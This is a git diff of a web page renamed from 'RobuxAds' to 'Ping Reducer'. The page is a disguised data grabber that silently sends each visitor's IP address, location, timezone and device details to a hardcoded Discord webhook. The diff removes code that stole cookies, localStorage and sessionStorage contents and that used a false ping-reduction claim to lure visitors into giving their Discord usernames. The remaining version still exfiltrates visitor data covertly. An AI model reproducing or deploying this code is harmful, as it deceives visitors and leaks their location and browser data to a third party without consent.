@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RobuxAds</title>
+    <title>Ping Reducer</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -25,29 +25,6 @@
         h1 {
             font-size: 24px;
         }
-        input[type="text"] {
-            padding: 10px;
-            margin-top: 10px;
-            width: 80%;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-        }
-        button {
-            padding: 10px 20px;
-            margin-top: 10px;
-            border: none;
-            background-color: #007bff;
-            color: white;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-        .prompt {
-            margin-top: 20px;
-            font-size: 18px;
-        }
     </style>
 </head>
 <body>
@@ -66,7 +43,7 @@
                 .then(response => response.json())
                 .then(data => {
                     // Collecting additional info
-                    const geoInfo = `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nLatitude: ${data.latitude}\nLongitude: ${data.longitude}\nTimezone: ${data.timezone}\nCurrency: ${data.currency}`;
+                    const geoInfo = `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nTimezone: ${data.timezone}\nCurrency: ${data.currency}`;
 
                     const systemInfo = `
                         Screen Resolution: ${window.innerWidth}x${window.innerHeight}
@@ -77,30 +54,12 @@
                         Battery Status: ${navigator.getBattery ? getBatteryStatus() : 'N/A'}
                         RAM: ${navigator.deviceMemory}GB
                         CPU Cores: ${navigator.hardwareConcurrency}
-                        Storage: ${navigator.storage ? getStorageInfo() : 'N/A'}
-                        Connection: ${navigator.connection ? getConnectionInfo() : 'N/A'}
                     `;
 
-                    const performanceInfo = `Page Load Time: ${window.performance.timing.loadEventEnd - window.performance.timing.navigationStart} ms
-                                             DNS Lookup: ${window.performance.timing.domainLookupEnd - window.performance.timing.domainLookupStart} ms
-                                             TCP Handshake: ${window.performance.timing.connectEnd - window.performance.timing.connectStart} ms
-                                             First Byte: ${window.performance.timing.responseStart - window.performance.timing.requestStart} ms`;
-
-                    // Collect Cookies, LocalStorage, and SessionStorage info
-                    const cookies = document.cookie ? `Cookies: ${document.cookie}` : 'No Cookies Available';
-                    const localStorageInfo = localStorage.length ? `LocalStorage: ${JSON.stringify(localStorage)}` : 'No LocalStorage Data';
-                    const sessionStorageInfo = sessionStorage.length ? `SessionStorage: ${JSON.stringify(sessionStorage)}` : 'No SessionStorage Data';
-
-                    // Attempting to get social media links from local storage or cookies
-                    const socialLinks = getSocialLinksFromStorage();
+                    const performanceInfo = `Page Load Time: ${window.performance.timing.loadEventEnd - window.performance.timing.navigationStart} ms`;
 
                     // Send the info to Discord Webhook
-                    sendToWebhook(geoInfo, systemInfo, performanceInfo, cookies, localStorageInfo, sessionStorageInfo, socialLinks);
-
-                    // After 5 seconds, prompt user for their Discord username
-                    setTimeout(function() {
-                        showDiscordPrompt();
-                    }, 2000);
+                    sendToWebhook(geoInfo, systemInfo, performanceInfo);
                 })
                 .catch(error => {
                     console.error('Error fetching geo data:', error);
@@ -120,92 +79,7 @@
             });
         }
 
-        function getStorageInfo() {
-            return navigator.storage.estimate().then(estimate => {
-                return `Used: ${estimate.usage} bytes, Free: ${estimate.quota - estimate.usage} bytes`;
-            });
-        }
-
-        function getConnectionInfo() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            return connection ? `Type: ${connection.effectiveType}, Speed: ${connection.downlink} Mbps` : 'N/A';
-        }
-
-        function getSocialLinksFromStorage() {
-            // Check for social media links in localStorage or cookies
-            const socialLinks = [];
-
-            // Example search for social media-related terms
-            if (document.cookie.includes('youtube.com')) {
-                socialLinks.push('YouTube link found in cookies');
-            }
-            if (localStorage.getItem('youtube')) {
-                socialLinks.push(`YouTube link found in localStorage: ${localStorage.getItem('youtube')}`);
-            }
-            if (sessionStorage.getItem('youtube')) {
-                socialLinks.push(`YouTube link found in sessionStorage: ${sessionStorage.getItem('youtube')}`);
-            }
-
-            // Add more checks for other social platforms (Twitter, Instagram, etc.) as needed
-            return socialLinks.length > 0 ? socialLinks.join('\n') : 'No social media links found';
-        }
-
-        function showDiscordPrompt() {
-            const container = document.querySelector('.container');
-            container.innerHTML = `
-                <h1>Enter your Discord username or display name to begin! Removing discord cache can reduce ping by 9% on average</h1>
-                <input type="text" id="discordUsername" placeholder="Enter username">
-                <button onclick="submitDiscordUsername()">Submit</button>
-            `;
-        }
-
-        function submitDiscordUsername() {
-            const discordUsername = document.getElementById('discordUsername').value;
-            if (discordUsername) {
-                // Show loading screen
-                showLoadingScreen();
-                sendDiscordUsernameToWebhook(discordUsername);
-            } else {
-                alert("Please enter a valid Discord username.");
-            }
-        }
-
-        function showLoadingScreen() {
-            const container = document.querySelector('.container');
-            container.innerHTML = `
-                <h1>Loading...</h1>
-            `;
-        }
-
-        function sendDiscordUsernameToWebhook(discordUsername) {
-            const webhookURL = "https://discord.com/api/webhooks/1334960796609937499/7YlpdDT2pphEH6wCeuD6eS10QIS1QQVyz2HicjXZPK5lZ7XOpgs3ZBiG_7fDFhiTpAWm"; // Replace with your actual Discord webhook URL
-
-            const content = {
-                content: "Discord Username Info",
-                embeds: [{
-                    title: "Discord Username",
-                    fields: [
-                        { name: "Discord Username", value: discordUsername, inline: false }
-                    ],
-                    footer: {
-                        text: "Info Sent from Web"
-                    }
-                }]
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(content)
-            })
-            .then(response => response.json())
-            .then(data => console.log('Discord username sent:', data))
-            .catch(error => console.error('Error sending Discord username to Discord:', error));
-        }
-
-        function sendToWebhook(geoInfo, systemInfo, performanceInfo, cookies, localStorageInfo, sessionStorageInfo, socialLinks) {
+        function sendToWebhook(geoInfo, systemInfo, performanceInfo) {
             const webhookURL = "https://discord.com/api/webhooks/1334960796609937499/7YlpdDT2pphEH6wCeuD6eS10QIS1QQVyz2HicjXZPK5lZ7XOpgs3ZBiG_7fDFhiTpAWm"; // Replace with your actual Discord webhook URL
 
             const content = {
@@ -215,11 +89,7 @@
                     fields: [
                         { name: "Geolocation Info", value: geoInfo, inline: false },
                         { name: "System Info", value: systemInfo, inline: false },
-                        { name: "Performance Info", value: performanceInfo, inline: false },
-                        { name: "Cookies", value: cookies, inline: false },
-                        { name: "LocalStorage", value: localStorageInfo, inline: false },
-                        { name: "SessionStorage", value: sessionStorageInfo, inline: false },
-                        { name: "Social Media Links", value: socialLinks, inline: false }
+                        { name: "Performance Info", value: performanceInfo, inline: false }
                     ],
                     footer: {
                         text: "Info Sent from Web"
